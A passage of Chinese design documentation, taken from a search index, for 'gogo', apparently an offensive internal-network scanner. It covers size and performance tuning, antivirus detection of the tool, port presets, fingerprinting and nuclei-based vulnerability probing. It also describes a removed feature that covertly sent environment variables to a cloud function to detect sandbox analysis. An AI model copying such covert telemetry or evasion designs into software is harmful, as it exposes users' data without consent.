<pre><code>github.com/M09ic/go-ntlmsspv1.2.10-0.20221207030820-de2792a93fef\ngithub.com/chainreactors/filesv0.2.4\ngithub.com/chainreactors/ipcsv0.0.9\ngithub.com/chainreactors/logsv0.6.1\ngithub.com/chainreactors/parsersv0.2.9-0.20221210155102-cc0814762410\ngithub.com/jessevdk/go-flagsv1.5.0\ngithub.com/panjf2000/ants/v2v2.5.0\nsigs.k8s.io/yamlv1.3.0\n</code></pre> <p><code>go-ntlmssp</code>\u662f\u6211\u4fee\u6539\u540e\u7684\u7248\u672c, \u964d\u4f4e\u5bf9\u7248\u672c\u7684\u9700\u6c42, \u4fee\u590d\u4e86\u4e00\u4e9bbug, \u4e0d\u4f9d\u8d56\u4efb\u4f55\u7b2c\u4e09\u65b9\u4ed3\u5e93\u3002</p> <p><code>go-flags</code>\u8fd9\u4e2a\u5e93\u53ea\u4f9d\u8d56go\u81ea\u8eab\u7684<code>sys</code>, \u4e0d\u4f1a\u5f15\u5165\u989d\u5916\u7684\u4f9d\u8d56\u3002</p> <p><code>ants</code>\u7528\u4f5c\u534f\u7a0b\u6c60\u590d\u7528\u4e0e\u63a7\u5236, \u4f9d\u8d56\u4e5f\u6bd4\u8f83\u5c11, \u5e76\u4e14\u56e0\u4e3a\u6ca1\u7528\u5230\u8fd9\u4e2a\u5e93\u7684\u9ad8\u7ea7\u529f\u80fd, \u5b83\u7684\u4f9d\u8d56\u5728\u7f16\u8bd1\u65f6\u4f1a\u88ab\u81ea\u52a8\u53bb\u6389\u3002</p> <p><code>chainreactors</code>\u7684\u51e0\u4e2a\u4ed3\u5e93\u5219\u662f\u4e00\u4e9b\u9700\u8981\u590d\u7528\u7684\u901a\u7528\u4ee3\u7801, \u57fa\u672c\u4e0a\u53ea\u4f7f\u7528\u539f\u751f\u7684go\u91cd\u5199\u4e86\u5927\u90e8\u5206\u9700\u8981\u5bfc\u5165\u7b2c\u4e09\u65b9\u5e93\u7684\u529f\u80fd\u3002\u5f15\u5165\u4e86\u5c11\u6570\u7684\u51e0\u4e2a\u5e93\u4e5f\u7ecf\u8fc7\u6587\u4ef6\u5927\u5c0f, \u517c\u5bb9\u6027\u7684\u8bc4\u4f30\u3002</p> <p><code>yaml</code>\u5e93\u53ea\u5728<code>go generate</code>\u65f6\u751f\u6548, \u5b9e\u9645\u4e0a\u6253\u5305\u7f16\u8bd1\u65f6\u4e0d\u4f1a\u7f16\u8bd1\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d.</p> <p>\u76ee\u524d\u5bf9gogo\u4f53\u79ef\u5f71\u54cdtop10\u7684\u5305(\u5f53\u7136\u5b9e\u9645\u4f53\u79ef\u4e0d\u662f\u8fd9\u4e9b\u5305\u76f8\u52a0, go\u7684\u7f16\u8bd1\u4f18\u5316\u672c\u8eab\u4e5f\u80fd\u8fdb\u884c\u538b\u7f29)\uff1a</p> <pre><code>8.2 MB runtime\n6.9 MB net/http\n2.9 MB reflect\n2.9 MB crypto/tls\n2.5 MB net\n1.7 MB syscall\n1.7 MB math/big\n1.4 MB github.com/jessevdk/go-flags\n1.3 MB crypto/x509\n1.1 MB encoding/json\n</code></pre> <p>\u9664\u4e86go-flags\u53ef\u4ee5\u518d\u8fdb\u884c\u4f18\u5316, \u5176\u4ed6\u57fa\u672c\u90fd\u5df2\u7ecf\u5230\u7406\u8bba\u6781\u9650\u3002</p> <p>\u76ee\u524d\u53bb\u6389\u8c03\u8bd5\u4fe1\u606f\u4e0e\u7b26\u53f7\u8868\u4e4b\u540e\u7f16\u8bd1\u51fa\u6765\u7684\u4f53\u79ef\u7ea65M, \u901a\u8fc7upx\u538b\u7f29\u540e\u57282M\u5de6\u53f3\u3002\u662f\u76ee\u524d\u540c\u7c7b\u5de5\u5177\u7684\u6700\u5c0f\u72b6\u6001, \u4e5f\u662f\u5728\u6ca1\u6709\u9ed1\u9b54\u6cd5\u60c5\u51b5\u4e0b\u7684\u6781\u9650\u4e86\u3002</p> <p>\u6b63\u662f\u901a\u8fc7\u8fd9\u4e9b\u4f18\u5316, gogo\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u6ca1\u6709\u4efb\u4f55\u517c\u5bb9\u6027\u95ee\u9898, \u6211\u9047\u5230\u8fc7\u6700\u4f4e\u7684windows2000\u4ee5\u53ca\u4e00\u4e9b\u8d85\u4f4e\u7248\u672c\u7684Linux, \u751a\u81f3\u94f6\u884c\u5185\u90e8\u7684sun/bsd\u4e4b\u7c7b\u7684\u8d85\u8001\u673a\u5668\u4e0a\u4e5f\u80fd\u6b63\u5e38\u8fd0\u884cgogo, \u5728\u8fd9\u4e9b\u7cfb\u7edf\u4e0a\u4fdd\u8bc1\u4e86\u5168\u91cf\u7684\u529f\u80fd\u3002</p> <p>\u5bf9\u7cfb\u7edf\u7684\u5360\u7528</p> <p>gogo\u7684\u5185\u5b58\u6d88\u8017\u4e3b\u8981\u6765\u81eagoroutine\u81ea\u8eab\u7684\u6808, \u5df2\u7ecf\u5c1d\u8bd5\u901a\u8fc7\u590d\u7528goroutine\u51cf\u5c11\u8fd9\u4e2a\u5f00\u9500\u3002\u901a\u8fc7\u51e0\u4e2a\u7248\u672c\u7684\u9488\u5bf9\u6027\u4f18\u5316, \u57fa\u672c\u80fd\u5728\u8d85\u4f4e\u6027\u80fd\u7684\u673a\u5668(1C 512M\u5185\u5b58\u8dd14000\u5e76\u53d1)\u4e0a\u6b63\u5e38\u8fd0\u884c.</p> <p>\u572864\u4f4d\u7684\u673a\u5668\u4e0a, gogo\u6bcf\u591a1000\u4e2a\u5e76\u53d1, \u591a\u5360\u7528\u7ea650M\u5185\u5b58, \u5e76\u901a\u8fc7\u751f\u6210\u5668\u4ee5\u53ca\u5b9e\u65f6\u7684\u6570\u636e\u540c\u6b65\u914d\u4e0ago\u672c\u8eab\u7684\u5783\u573e\u56de\u6536, \u4e0d\u4f1a\u968f\u7740\u76ee\u6807\u6570\u91cf\u589e\u52a0\u4ee5\u53ca\u8fd0\u884c\u65f6\u95f4\u5bfc\u81f4\u5185\u5b58\u7684\u65e0\u9650\u7ebf\u6027\u589e\u957f\u3002\u8fd9\u4e5f\u662fgogo\u80fd\u8ba9\u626b\u63cfA\u6bb5\u6210\u4e3a\u53ef\u80fd\u7684\u6838\u5fc3\u539f\u56e0\u4e4b\u4e00\u3002</p> <p>gogo\u5bf9CPU\u7684\u6027\u80fd\u6d88\u8017\u5e76\u4e0d\u5c0f, \u4f46\u4e5f\u8fdc\u8fdc\u4f18\u4e8e\u540c\u7c7b\u5de5\u5177\u3002\u5728\u4e91\u4e0a\u5355\u6838\u673a\u5668\u4e0a\u6d4b\u8bd5, nmap 100\u4e2athread\u5c31\u80fd\u5c06CPU\u957f\u65f6\u95f4\u5360\u6ee1, \u5176\u4ed6\u7684go\u5199\u7684\u540c\u7c7b\u5de5\u5177\u6027\u80fd\u8868\u73b0\u7565\u597d\u4e8enmap\u3002gogo\u5927\u6982\u4f1a\u57285-20%\u4e4b\u95f4\u6ce2\u52a8, \u5076\u5c14\u4f1a\u8d85\u8fc750%\u3002\u540e\u7eed\u5c06\u4f1a\u6709\u51e0\u4e2a\u7248\u672c\u4e13\u95e8\u9488\u5bf9CPU\u6027\u80fd\u8fdb\u884c\u4f18\u5316\u3002</p> <p>\u514d\u6740</p> <p>\u5f88\u957f\u4e00\u6bb5\u65f6\u671f, gogo\u56e0\u4e3a\u5185\u90e8\u4f7f\u7528, \u53ef\u4ee5\u65e0\u89c6\u6240\u6709\u6740\u8f6f\u3002\u4f46\u5728\u957f\u65f6\u671f\u7684\u5bf9\u6297\u4e2d, \u6709\u4e0d\u5c11\u9632\u5b88\u65b9\u6355\u83b7\u5230\u4e86\u6837\u672c, \u5e76\u5bf9\u5176\u8fdb\u884c\u4eba\u5de5\u6216\u8005\u6c99\u7bb1\u7684\u5206\u6790\u3002\u73b0\u5728\u5df2\u7ecf\u80fd\u88ab\u5361\u5df4\u65af\u57fa, Windows defender, \u6838\u6676\u6a21\u5f0f\u4e0b\u7684360\u7b49\u6740\u8f6f\u8bc6\u522b\u3002</p> <p>\u540e\u7eed\u4f5c\u4e3a\u4e00\u4e2a\u516c\u5f00\u7684\u5de5\u5177, \u4e5f\u4e0d\u4f1a\u5728\u514d\u6740\u4e0a\u505a\u8fdb\u4e00\u6b65\u7684\u5bf9\u6297, \u53ef\u80fd\u9700\u8981\u4f7f\u7528\u8005\u81ea\u884c\u514d\u6740\u3002</p> <p>\u4e00\u4e9b\u59a5\u534f</p> <p>gogo\u5176\u5b9e\u5728\u5386\u53f2\u4e0a\u6dfb\u52a0\u8fc7\u4e00\u4e9b\u529f\u80fd, \u4f46\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u5df2\u7ecf\u88ab\u5220\u9664\uff1a</p> <ul> <li>\u66fe\u7ecf\u5185\u90e8\u4f7f\u7528\u65f6\u671f, gogo\u662f\u6709key\u7684, \u5e76\u4e14\u5728\u8f93\u51fakey\u7684\u65f6\u5019\u4f1a\u83b7\u53d6\u73af\u5883\u53d8\u91cf\u56de\u4f20\u5230\u4e91\u51fd\u6570\u4e0a\u3002\u7528\u6765\u786e\u8ba4gogo\u88ab\u5206\u6790\u3001\u88ab\u6355\u83b7\u7684\u60c5\u51b5\u3002\u4e5f\u662f\u8fd9\u4e2a\u529e\u6cd5\u90a3\u6bb5\u65f6\u95f4\u6293\u4e86\u4e0d\u5c11\u6c99\u7bb1\u4fe1\u606f\u3002</li> <li>gogo\u66fe\u7ecf\u652f\u6301\u81ea\u52a8\u56de\u4f20\u7ed3\u679c\u5230\u4e91\u51fd\u6570, \u516c\u5f00\u7248\u672c\u53ef\u80fd\u4f1a\u88ab\u8bef\u8ba4\u4e3a\u540e\u95e8, \u4e5f\u53bb\u6389\u4e86</li> <li>gogo\u66fe\u7ecf\u652f\u6301<code>--eip</code>, \u6392\u9664\u6307\u5b9a\u7684ip\u626b\u63cf, \u4f46\u56e0\u4e3a\u8fd9\u4e48\u505a\u9700\u8981\u7ef4\u62a4\u4e00\u4e2a\u8f83\u5927\u7684hash\u8868, \u5e76\u4e14\u5982\u679c\u8f93\u5165\u7684<code>--eip</code>\u8f83\u5927, \u5bfc\u81f4ip\u5c55\u5f00\u6d88\u8017\u8f83\u591a\u5185\u5b58\u800c\u5220\u9664\u3002\u4f46\u73b0\u5728\u627e\u5230\u4e86\u89e3\u51b3\u529e\u6cd5, \u540e\u7eed\u7248\u672c\u4f1a\u91cd\u6784\u540e\u6dfb\u52a0\u56de\u6765\u3002</li> <li>gogo\u66fe\u7ecf\u652f\u6301<code>--arp</code>\u4ee5\u53ca<code>-parp</code>, \u901a\u8fc7arp\u534f\u8bae\u8fdb\u884c\u542f\u53d1\u5f0f\u63a2\u6d4b, \u6216\u8005\u83b7\u53d6mac\u5730\u5740\u3002\u4f46\u56e0\u4e3a\u6784\u9020arp\u5305\u9700\u8981\u4f9d\u8d56gopacket\u63d0\u4f9b\u7684rawsocket, \u4f1a\u5728\u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u65e0\u6cd5\u8fd0\u884c\u3002icmp\u534f\u8bae\u5b9e\u9645\u4e0a\u4e5f\u4f1a\u53d1\u9001arp\u5305, \u5b9e\u9645\u4e0a\u4e0earp\u6709\u91cd\u590d, \u56e0\u6b64\u53bb\u6389\u4e86arp\u529f\u80fd\u3002</li> <li>gogo\u66fe\u7ecf\u80fd\u5c06host\u5e26\u5230\u6bcf\u4e2a\u63d2\u4ef6\u7684\u626b\u63cf\u4e2d, \u4f46\u56e0\u4e3a\u4ea7\u751f\u4e86\u66f4\u591a\u7684\u95ee\u9898, \u51b3\u5b9a\u575a\u6301\u5176\u5185\u7f51\u4e3a\u4e3b\u7684\u5b9a\u4f4d, \u4ec5\u5728<code>nucleiscan</code>\u4e0e<code>hostscan</code>\u4e2d\u4f1a\u5e26\u4e0ahost\u3002</li> </ul> <p>\u5176\u4ed6\u8fd8\u6709\u4e00\u4e9b\u5728\u6f0f\u6d1e\u8bc6\u522b, \u6307\u7eb9\u8bc6\u522b\u4e0a\u505a\u7684\u59a5\u534f, \u4f1a\u5728\u4ecb\u7ecd\u76f8\u5173\u529f\u80fd\u65f6\u4ecb\u7ecd.</p>"},{"location":"gogo/design/#feature","title":"Feature","text":"<p>gogo\u7ecf\u8fc7\u63a5\u8fd1\u4e24\u5e74\u7684\u5b9e\u6218\u6253\u78e8, \u81ea\u8ba4\u4e3a\u5df2\u7ecf\u5728\u7528\u6237\u4f53\u9a8c\u4e0a\u505a\u5230\u4e86\u6211\u4eec\u7684\u6700\u5927\u53ef\u80fd\u3002\u4f46\u968f\u7740\u529f\u80fd\u8d8a\u6765\u8d8a\u590d\u6742, \u8fd8\u662f\u6709\u4e0d\u5c0f\u7684\u5b66\u4e60\u6210\u672c\u3002</p>"},{"location":"gogo/design/#\u542f\u53d1\u5f0f\u626b\u63cf","title":"\u542f\u53d1\u5f0f\u626b\u63cf","text":"<p>\u5728nmap, masscan\u90a3\u4e2a\u5e74\u4ee3, \u5bf9\u5185\u7f51\u7684\u626b\u63cf\u5f88\u5c11\u4f1a\u8d85\u8fc7C\u6bb5, \u66f4\u522b\u8bf4A\u6bb5\u8fd9\u79cd\u5728\u5f53\u65f6\u51e0\u4e4e\u4e0d\u53ef\u80fd\u5b8c\u6210\u7684\u4efb\u52a1\u3002</p> <p>\u73b0\u5728\u7684\u626b\u63cf\u5668, \u6216\u8005\u76f8\u5173\u7279\u5316\u7684\u5de5\u5177netspy\u90fd\u6ca1\u6709\u5f88\u597d\u7684\u5b9e\u73b0, \u53ea\u505c\u7559\u5728\u52c9\u5f3a\u80fd\u7528\u7684\u9636\u6bb5\u3002</p> <p>\u800cgogo\u5728\u5f88\u65e9\u5c31\u96c6\u6210\u4e86\u6839\u636e\u7ecf\u9a8c\u516c\u5f0f\u7684\u9012\u5f52\u4e0b\u964d\u53bb\u53d1\u73b0\u7f51\u6bb5, \u5e76\u4e14\u901a\u8fc7\u751f\u6210\u5668\u5bf9\u626b\u63cf\u903b\u8f91\u89e3\u8026, \u53ef\u4ee5\u4efb\u610f\u7ec4\u5408\u4e0d\u540c\u7684\u626b\u63cf\u9636\u6bb5, \u4f8b\u5982\uff1a</p> <ul> <li>\u60f3\u7ed8\u5236\u4e00\u4e0b\u5f53\u524d\u5165\u53e3\u70b9\u80fd\u901a\u7684\u7f51\u7edc\u62d3\u6251(\u5927\u7ea630\u5206\u949f)</li> <li>\u53ea\u60f3\u770b\u770b10\u6bb5\u5185\u7f51\u91cc\u6709\u591a\u4e2aB\u6bb5\u88ab\u4f7f\u7528\u4e86(\u5927\u7ea630\u79d2)</li> <li>\u53ea\u60f3\u770b\u770b10\u7f51\u6bb5\u4e2d\u6709\u591a\u5c11ip\u5b58\u6d3b(\u5927\u7ea630\u5206\u949f)</li> <li>\u60f3\u626b\u63cf\u4e0b10\u6bb5\u4e2d\u7684\u8d44\u4ea7(\u770b\u524d\u4e24\u9636\u6bb5\u5b58\u6d3b\u7684\u8d44\u4ea7\u6570\u91cf, \u5927\u7ea61-2\u5c0f\u65f6)</li> <li>\u4e0d\u4ec5\u60f3\u626b\u63cf\u8d44\u4ea7, \u8fd8\u60f3\u8bc6\u522b\u4e0b\u6307\u7eb9, \u63a2\u6d4b\u4e0b\u6f0f\u6d1e(\u57fa\u672c\u548c\u63a2\u6d4b\u8d44\u4ea7\u65f6\u95f4\u76f8\u540c, \u91c7\u7528\u6700\u5c0f\u53d1\u5305\u539f\u5219, \u63a2\u6d4b\u6307\u7eb9\u4e0e\u6f0f\u6d1e\u4e0d\u4f1a\u591a\u8017\u65f6\u591a\u5c11, \u5927\u7ea6\u591a20-30%\u8017\u65f6)</li> <li>\u6211\u60f3\u4e00\u53e3\u6c14\u628a10, 172, 192\u5185\u7f51\u5168\u63a2\u6d4b\u4e86, \u5e76\u8f93\u51fa\u62a5\u544a(\u770b\u8d44\u4ea7\u6570\u91cf, \u5927\u7ea61-2\u5c0f\u65f6)</li> <li>......</li> </ul> <p>\u5f53\u7136, \u8fd9\u91cc\u7684\u7f51\u6bb5\u53ef\u4ee5\u81ea\u5b9a\u4e49, \u4e0d\u4e00\u5b9a\u662f10\u3002\u5927\u81f4\u53ef\u4ee5\u7406\u89e3\u4e3afscan\u4e0enetspy\u7684\u7ed3\u5408, \u5b9e\u9645\u4e0a\u4f1a\u66f4\u52a0\u590d\u6742\u4e00\u70b9\u3002</p> <p>\u7528\u547d\u4ee4\u884c\u6784\u9020\u8fd9\u4e9b\u573a\u666f\u8f83\u4e3a\u590d\u6742, \u7ecf\u8fc7\u4e0d\u5c11\u670b\u53cb\u8bd5\u7528\u5410\u69fd\u540e, \u6dfb\u52a0\u4e86workflow, \u53ea\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u5373\u53ef\u8986\u76d6\u7edd\u5927\u591a\u6570\u5e38\u89c1\u7684\u4f7f\u7528\u573a\u666f.\u5177\u4f53\u7684\u4f7f\u7528\u8bf4\u660e\u89c1\u4ed3\u5e93\u4e2d\u7684README.md\u4e0e\u8bbe\u8ba1\u6587\u6863\u3002</p>"},{"location":"gogo/design/#\u4fbf\u6377\u7684\u7aef\u53e3\u914d\u7f6e","title":"\u4fbf\u6377\u7684\u7aef\u53e3\u914d\u7f6e","text":"<p>\u521a\u624d\u63d0\u5230\u7684\u542f\u53d1\u5f0f\u626b\u63cf, \u4e3b\u8981\u662f\u5728\u626b\u63cf\u903b\u8f91\u4e0a\u7684\u914d\u7f6e, \u800c\u5bf9\u4e8e\u5177\u4f53\u7aef\u53e3\u8d44\u4ea7, gogo\u4e5f\u63d0\u4f9b\u4e86\u53ca\u5176\u65b9\u4fbf\u7684\u7aef\u53e3\u9884\u8bbe\u3002</p> <ul> <li>\u626b\u63cf\u5e38\u89c1\u7684http\u670d\u52a1, <code>-p top3</code>\u6216<code>-p top2</code></li> <li>\u626b\u63cf\u6570\u636e\u5e93<code>-p db</code></li> <li> <p>\u4f7f\u7528\u591a\u4e2a\u9884\u8bbe<code>-p top3,db,win</code></p> </li> <li> <p>\u4f7f\u7528\u591a\u4e2a\u9884\u8bbe, \u540c\u65f6\u6307\u5b9a\u67d0\u4e2a\u533a\u95f4\u7f51\u6bb5<code>-p top3,db,win,40000-50000</code></p> </li> <li>...</li> </ul> <p>\u901a\u8fc7name\u4e0etags\u7684\u4ea4\u53c9\u7ba1\u7406, \u80fd\u5feb\u901f\u914d\u7f6e\u5404\u79cd\u4f7f\u7528\u573a\u666f\u3002</p> <p>\u5982\u679c\u8981\u6dfb\u52a0\u9884\u8bbe, \u53ef\u4ee5\u5728github\u7684gogo-template\u4e2d\u7684port.yaml\u63d0\u4ea4pr\u3002</p>"},{"location":"gogo/design/#\u6307\u7eb9\u8bc6\u522b","title":"\u6307\u7eb9\u8bc6\u522b","text":"<p>\u91cd\u8981</p> <p>gogo\u5bf9\u4e8e\u6307\u7eb9\u8bc6\u522b\u7684\u6001\u5ea6\u662f\u5c3d\u53ef\u80fd\u5168, \u5bb9\u8bb8\u5c11\u91cf\u7684\u8bef\u62a5. \u56e0\u6b64\u90e8\u5206\u6307\u7eb9\u8d28\u91cf\u4e0d\u9ad8, \u5982\u679c\u53d1\u751f\u4e86\u5927\u91cf\u8bef\u62a5\u6b22\u8fce\u63d0\u4f9bissue.</p> <p>gogo\u7684\u6307\u7eb9\u4e0e\u6f0f\u6d1e\u90fd\u5c06\u5b8c\u5168\u4ee5dsl\u7684\u65b9\u5f0f\u5b9e\u73b0, \u5373\u901a\u8fc7yaml\u914d\u7f6e\u3002</p> <p>\u56e0\u4e3a\u5e76\u6ca1\u6709\u627e\u5230\u4e00\u4e2a\u5b8c\u5168\u80fd\u6ee1\u8db3\u6211\u9700\u6c42\u7684\u89c4\u5219\u5e93\u4e0e\u5f15\u64ce\u3002gogo\u91cd\u65b0\u8bbe\u8ba1\u4e86\u4e00\u5957\u5f15\u64ce, \u800c\u6307\u7eb9\u5e93\u5219\u9009\u62e9\u6574\u5408\u4e86fofa\u7684\u89c4\u5219\u5e93, fingerprinthub, kscan, allin\u4e2d\u7684\u4e00\u90e8\u5206\u89c4\u5219, \u4ee5\u53ca\u5927\u91cf\u7684gogo\u72ec\u6709\u7684\u6307\u7eb9\u3002</p> <p>\u6307\u7eb9\u8bc6\u522b\u770b\u8d77\u6765\u7b80\u5355, \u4f46\u6211\u4eec\u5728\u5b9e\u6218\u4e2d\u9047\u5230\u4e86\u4e00\u4e2a\u63a5\u4e00\u4e2a\u9884\u671f\u5916\u7684\u95ee\u9898\u3002\u6307\u7eb9\u8bc6\u522b\u5e76\u4e0d\u662f\u53ea\u5339\u914d\u5173\u952e\u5b57\u5c31\u80fd\u505a\u597d\u7684, \u5176\u4e2d\u5305\u542b\u4e86\u5927\u91cf\u7ec6\u8282\u3002\u4e3e\u51e0\u4e2a\u4f8b\u5b50\uff1a</p> <ul> <li>\u67d0\u4e2ahttp\u7ad9, \u8bbf\u95ee\u4f1a\u901a\u8fc730x\u8df3\u8f6c, \u4f46\u662f\u8df3\u8f6c\u8fc7\u53bb\u7684\u7ad9\u662f\u4e2a404\u9875\u9762(\u9ed8\u8ba4\u914d\u7f6e\u7684\u84dd\u51ccoa)\u3002</li> <li>\u67d0\u4e2ahttp\u7ad9, \u76f4\u63a5\u8bbf\u95ee80\u7aef\u53e3\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u901a\u8fc7js\u8fdb\u884c\u8df3\u8f6c\u7684\u9875\u9762, \u8fd9\u79cd\u60c5\u51b5\u6307\u7eb9\u5339\u914d\u4e0d\u4e00\u5b9a\u80fd\u751f\u6548\u3002</li> <li>\u67d0\u4e2ahttp\u7ad9, \u4e00\u8bbf\u95ee\u5c31\u4f1a\u4e0b\u8f7d\u6587\u4ef6, \u90a3\u4e2a\u6587\u4ef6\u53ef\u80fd\u6709\u51e0\u767eM\u5927\u5c0f\u3002</li> </ul> <p>\u5982\u679c\u662f\u975ehttp\u534f\u8bae\u7684\u7aef\u53e3, \u90a3\u60c5\u51b5\u5c31\u66f4\u591a\u4e86\u3002</p> <ul> <li> <p>\u67d0\u4e9b\u670d\u52a1, \u5efa\u7acb\u5b8c\u63e1\u624b\u5c31\u4f1a\u8fd4\u56debanner, \u5982\u679c\u4f60\u53d1\u9001\u4e86\u5b83\u65e0\u6cd5\u8bc6\u522b\u7684\u6570\u636e, \u4ed6\u5c31\u4f1aresetTCP\u94fe\u63a5(SSH)\u3002</p> </li> <li> <p>\u5982\u679c\u5bf9\u67d0\u4e9b\u670d\u52a1\u53d1\u9001\u4e86\u4ed6\u65e0\u6cd5\u8bc6\u522b\u7684\u6570\u636e, \u4ed6\u4e0d\u4f1a\u65ad\u5f00TCP\u94fe\u63a5, \u4f46\u662f\u4e0d\u518d\u4f1a\u8fd4\u56de\u6570\u636e(MSSQL)\u3002</p> </li> <li> <p>\u67d0\u4e9b\u534f\u8bae\u6709\u5404\u79cd\u5404\u6837\u7684\u53d1\u884c\u7248, \u6bcf\u4e2a\u53d1\u884c\u7248\u7684banner\u90fd\u4e0d\u540c, \u5e76\u4e14\u6ca1\u6709\u660e\u663e\u7684\u89c4\u5f8b(FTP\u4e0eTELNET)\u3002</p> </li> </ul> <p>\u597d\u5728nmap\u5df2\u7ecf\u89e3\u51b3\u4e86\u670d\u52a1\u6307\u7eb9\u7684\u5927\u90e8\u5206\u95ee\u9898, \u53ea\u662f\u5982\u679c\u76f4\u63a5\u4f7f\u7528nmap\u7684\u6307\u7eb9\u5e93, \u8fc7\u4e8e\u5e9e\u5927\u7684\u6307\u7eb9\u5e93\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u6027\u80fd\u6d88\u8017\u3002\u67d0\u4e9b\u626b\u63cf\u5668\u5c31\u76f4\u63a5\u4f7f\u7528nmap\u7684\u6307\u7eb9\u5e93, \u5bfc\u81f4\u6307\u7eb9\u5339\u914d\u7684\u65f6\u95f4\u5927\u4e8e\u626b\u63cf\u7684\u65f6\u95f4\u3002</p> <p>\u5149\u662fhttp\u6307\u7eb9\u8bc6\u522b\u7684\u7279\u6b8a\u60c5\u51b5\u751a\u81f3\u8d85\u8fc7\u4e86gogo\u80fd\u5904\u7406\u7684\u8303\u56f4, \u5982\u679c\u52a0\u4e0a\u8fd9\u4e9b\u529f\u80fd, gogo\u4e0d\u53ef\u907f\u514d\u7684\u4f1a\u53d8\u5f97\u81c3\u80bf, \u56e0\u6b64, \u90e8\u5206http\u6307\u7eb9\u8bc6\u522b\u7684\u529f\u80fd, \u7279\u522b\u662f\u4e3b\u52a8\u6307\u7eb9\u63a2\u6d4b\u76f8\u5173\u529f\u80fd, \u8ba1\u5212\u5c06\u79fb\u690d\u5230spray\u4e2d\u3002\u53ea\u5728gogo\u4e2d\u4fdd\u7559\u6700\u57fa\u672c\u7684\u4e3b\u52a8\u8bc6\u522b\u3002\u5728\u5185\u7f51\u7edd\u5927\u591a\u6570\u60c5\u51b5, \u6f0f\u62a5\u4e00\u4e24\u4e2a\u6307\u7eb9\u5e76\u4e0d\u4f1a\u5f71\u54cd\u6211\u4eec\u7684\u540e\u7eed\u64cd\u4f5c\u3002</p>"},{"location":"gogo/design/#\u6f0f\u6d1e\u63a2\u6d4b","title":"\u6f0f\u6d1e\u63a2\u6d4b","text":"<p>\u91cd\u8981</p> <p>gogo\u5bf9\u4e8e\u6f0f\u6d1e\u63a2\u6d4b\u7684\u6001\u5ea6\u4e0e\u6307\u7eb9\u8bc6\u522b\u4e0d\u540c, gogo\u8ffd\u6c42\u5c3d\u53ef\u80fd\u5c11\u7684\u7279\u5f81\u548c\u4e0e\u53d1\u5305, \u4e5f\u4e0d\u5173\u6ce8\u5916\u7f51\u7684\u4e00\u4e9b\u5e38\u89c1\u6f0f\u6d1e(\u5f53\u7136\u5982\u679c\u6709\u4eba\u80fd\u6574\u7406\u51fa\u4e00\u4e2a\u8db3\u591f\u5f3a\u5927\u7684nuclei\u5916\u7f51poc\u5e93, \u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2a\u5916\u7f51\u4e13\u7528\u7248\u7684\u5206\u652f). </p> <p>gogo\u91cd\u5199\u4e86nuclei\u5173\u4e8ehttp\u4e0enetwork\u4e24\u4e2a\u6a21\u5757\u7684dsl\u5f15\u64ce, \u5728\u517c\u5bb9nucleiyaml\u5927\u90e8\u5206\u89c4\u5219\u7684\u540c\u65f6, \u53bb\u6389\u4e86\u5927\u91cf\u4e0d\u5fc5\u8981\u7684\u529f\u80fd, \u5e76\u6dfb\u52a0\u4e86\u4e00\u4e9b\u65b0\u7684\u529f\u80fd\u66f4.\u8be6\u60c5\u8bf7\u89c1\u62d3\u5c55nucleipoc</p> <p>\u76ee\u524dgogo\u652f\u6301\u7684\u6240\u6709\u6f0f\u6d1e: https://chainreactors.github.io/wiki/gogo/detail/#_6</p> <p>\u6bd4\u8d77\u4e00\u4e9b\u9879\u76ee\u76f4\u63a5\u8c03\u7528nuclei\u5305, gogo\u7684\u8fd9\u79cd\u65b9\u5f0f\u53bb\u6389\u4e86\u6240\u6709\u7684\u4f9d\u8d56, \u5e76\u6700\u5927\u7a0b\u5ea6\u7684\u5b9e\u73b0\u4e86nuclei\u7684\u5f15\u64ce, \u7f3a\u70b9\u662fdsl\u5f15\u64ce\u7684\u7248\u672c\u5c06\u4f1a\u7565\u5fae\u843d\u540e\u4e8enuclei\u672c\u4f53\u3002\u8003\u8651\u5230gogo\u7684\u4f7f\u7528\u573a\u666f, \u8fd9\u79cd\u843d\u540e\u5e76\u4e0d\u5f71\u54cd\u529f\u80fd, \u56e0\u6b64\u662f\u53ef\u4ee5\u63a5\u53d7\u7684\u4ee3\u4ef7\u3002</p> <p>\u7edd\u5927\u591a\u6570poc\u90fd\u53ef\u4ee5\u4ecenuclei\u4e2d\u79fb\u690dpoc, \u53ea\u9700\u8981\u505a\u4e00\u4e9b\u7b80\u5355\u4fee\u6539\u4e0e\u6d4b\u8bd5\u4fbf\u53ef\u4ee5\u5feb\u901f\u52a0\u5165\u5230gogo\u4e2d\u3002\u4e0d\u8fc7\u4e3a\u4e86\u4fdd\u8bc1poc\u8d28\u91cf\u4ee5\u53ca\u5185\u7f51\u4f7f\u7528\u573a\u666f, \u52a0\u5165\u5230gogo\u4e2d\u7684\u6f0f\u6d1e\u9700\u8981\u4e00\u5b9a\u7684\u7b5b\u9009\u3002</p> <p>nuclei\u7684poc\u4ed3\u5e93\u662f\u57fa\u4e8e\u793e\u533a\u7684, \u8fd9\u4e48\u505a\u7684\u597d\u5904\u662f\u793e\u533a\u6d3b\u8dc3poc\u66f4\u65b0\u975e\u5e38\u5feb, \u4f46\u8d28\u91cf\u4e0a\u96be\u4ee5\u628a\u63e1\u3002\u5728\u6211\u6df1\u5165\u4e86\u89e3\u4f7f\u7528\u540e, \u53d1\u73b0\u4e86nuclei-templates\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff1a</p> <ul> <li>\u6ca1\u6709\u533a\u5206poc\u548cexp\u3002\u5728\u5f88\u591ayaml\u4e2d, \u63d0\u4f9b\u5b8c\u6574\u7684exp\u53cd\u800c\u4f1a\u5bfc\u81f4\u66f4\u591a\u7684\u6f0f\u62a5\u4e0e\u8bbe\u5907\u544a\u8b66\u3002</li> <li>\u6ca1\u6709\u575a\u6301\u6700\u5c0f\u53d1\u5305\u539f\u5219\u3002\u7ecf\u5e38\u80fd\u770b\u5230\u7528\u4e86\u4e24\u4e09\u4e2a\u91cd\u590d\u529f\u80fd\u7684\u5305\u53bb\u5224\u65ad\u4e00\u4e2a\u5305\u5c31\u80fd\u89e3\u51b3\u7684\u95ee\u9898\u3002</li> 